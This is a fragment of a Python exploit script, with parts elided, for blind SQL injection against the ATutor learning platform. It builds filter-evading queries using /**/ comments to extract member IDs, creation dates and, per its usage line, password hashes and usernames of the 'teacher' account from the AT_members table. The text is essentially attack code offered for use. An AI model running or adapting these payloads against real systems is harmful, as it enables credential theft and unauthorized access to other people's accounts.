...
def main():
    if len(sys.argv) != 3:
        ...
        print('[!] eg: python %s atutor.local debug/test/db_version/username/password_hash/member_id/creation_date' % sys.argv[0])
        sys.exit(-1)
    ...
    elif (payload_type == "member_id"):
        query_password = "select/**/member_id/**/from/**/AT_members/**/where/**/login='teacher'"
        len_password = 3
        pwd_hash = searchFriends_bsqli(host, payload_type, query_password, len_password)
        
    elif (payload_type == "creation_date"):
        query_password = "select/**/creation_date/**/from/**/AT_members/**/where/**/login='teacher'"
        len_password = 30
        pwd_hash = searchFriends_bsqli(host, payload_type, query_password, len_password)
